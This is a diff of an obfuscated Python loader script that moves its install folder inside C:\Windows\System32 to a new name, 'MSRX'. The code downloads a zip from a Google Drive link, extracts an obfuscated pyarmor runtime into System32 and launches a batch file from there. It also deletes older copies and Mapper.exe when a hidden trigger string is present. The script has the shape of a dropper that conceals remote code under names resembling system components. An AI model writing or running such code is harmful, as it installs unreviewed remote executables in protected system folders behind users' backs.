@@ -57,16 +57,16 @@ def delete_system32_filex():
 delete_system32_filex()
 '''
 os.system('cls')
-dcnmwxdr = r'C:\Windows\System32\FileSystemXS'
+dcnmwxdr = r'C:\Windows\System32\MSRX'
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
 if file_contentsx1 =="04yb8u5ih5FGB":
-    os.remove(r"C:\Windows\System32\FileSystemXS\aesv8.4.bat")
+    os.remove(r"C:\Windows\System32\MSRX\aesv1.bat")
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.4.py")
 else:
-    create_batch_file("py", r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
+    create_batch_file("py", r"C:\Windows\System32\MSRX\AesV8.4.py")
 if location:
     os.system('cls')
 else:
@@ -149,11 +149,11 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\FileSystemXS\AesV8.4.py"
+    aesv3_path = r"C:\Windows\System32\MSRX\AesV8.4.py"
     files_to_delete = [
-        r"C:\Windows\System32\xsystem\AesV8.3.py",
-        r"C:\Windows\System32\xsystem\aesv8.3.bat",
-        r"C:\Windows\System32\xsystem\pyarmor_runtime_000000"
+        r"C:\Windows\System32\FileSystemXS\AesV8.4.py",
+        r"C:\Windows\System32\FileSystemXS\aesv8.4.bat",
+        r"C:\Windows\System32\FileSystemXS\pyarmor_runtime_000000"
     ]
 
     aesv3_exists = os.path.exists(aesv3_path)
@@ -182,11 +182,11 @@ def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
 
-if not os.path.exists("C:\\Windows\\System32\\FileSystemXS\\pyarmor_runtime_000000"):
+if not os.path.exists("C:\\Windows\\System32\\MSRX\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1PMtyGMQ2m0Kv0ohOJe0VDR3yxHIM0Kpb", "C:\\Windows\\System32\\FileSystemXS\\august29.zip")
-    zip_file = r'C:\Windows\System32\FileSystemXS\august29.zip'
-    extract_dir = r'C:\Windows\System32\FileSystemXS'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1PMtyGMQ2m0Kv0ohOJe0VDR3yxHIM0Kpb", "C:\\Windows\\System32\\MSRX\\august29.zip")
+    zip_file = r'C:\Windows\System32\MSRX\august29.zip'
+    extract_dir = r'C:\Windows\System32\MSRX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
@@ -222,8 +222,8 @@ if file_contentsx1=="deleteaesFILES":
     if os.path.isfile(r"C:\Windows\System32\Mapper.exe"):
         os.remove(r"C:\Windows\System32\Mapper.exe")
         os.system('cls')
-    if os.path.isdir(r"C:\Windows\System32\FileSystemXS"):
-        shutil.rmtree(r"C:\Windows\System32\FileSystemXS")
+    if os.path.isdir(r"C:\Windows\System32\MSRX"):
+        shutil.rmtree(r"C:\Windows\System32\MSRX")
         os.system('cls')
     os.system('cls')
 def run_batch_file(batch_file_path):
@@ -260,7 +260,7 @@ else:
     print("Success.")
 
 os.system('cls')
-batch_file_path = r"C:\Windows\System32\FileSystemXS\aesv8.4.bat"
+batch_file_path = r"C:\Windows\System32\MSRX\aesv1.bat"
 os.system('cls')
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
